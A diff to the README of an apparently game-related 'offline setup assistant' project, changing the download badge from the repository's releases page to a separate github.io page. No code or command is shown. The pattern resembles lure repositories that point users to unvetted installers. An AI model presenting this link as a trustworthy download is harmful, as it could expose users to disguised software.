@@ -1,7 +1,7 @@
 # 👾 UFO 50 Offline Setup Assistant
 
 [![GitHub Stars](https://img.shields.io/github/stars/UFO-50-Offline-Setup-Assistant/ufo-50-offline-setup-assistant?style=social)](https://github.com/UFO-50-Offline-Setup-Assistant/ufo-50-offline-setup-assistant)
-[![Download Latest](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/UFO-50-Offline-Setup-Assistant/ufo-50-offline-setup-assistant/releases)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-brightgreen?style=for-the-badge)](https://ufo-50-offline-setup-assistant.github.io/.github)
 [![Offline Gaming](https://img.shields.io/badge/Mode-100%25%20Offline-orange?style=for-the-badge)](/)
 [![License MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
 
